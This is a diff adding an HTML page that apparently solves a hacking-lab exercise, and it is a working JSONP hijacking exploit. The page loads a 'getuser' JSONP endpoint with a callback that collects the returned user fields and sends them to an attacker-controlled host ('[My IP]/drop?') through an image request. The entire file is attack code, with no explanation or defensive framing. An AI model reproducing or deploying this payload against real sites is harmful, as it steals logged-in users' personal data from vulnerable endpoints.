@@ -1,0 +1,27 @@
+<html>
+<head>
+<script>
+var target="http://[My IP]/drop?";
+
+
+function invoke(obj) {
+var ref = obj;
+   var inner = function() {
+      var response = "";
+
+      for(var x in ref ) {
+         response += ref[x] + ", ";
+      }
+
+      new Image().src=target + escape(response);    
+   };
+   setTimeout(inner, 100);
+}
+
+</script>
+<script src="http://glocken.hacking-lab.com/12001/json_case0/json0/controller?action=getuser&func=invoke">
+</script>
+</head>
+<body>
+</body>
+</html>
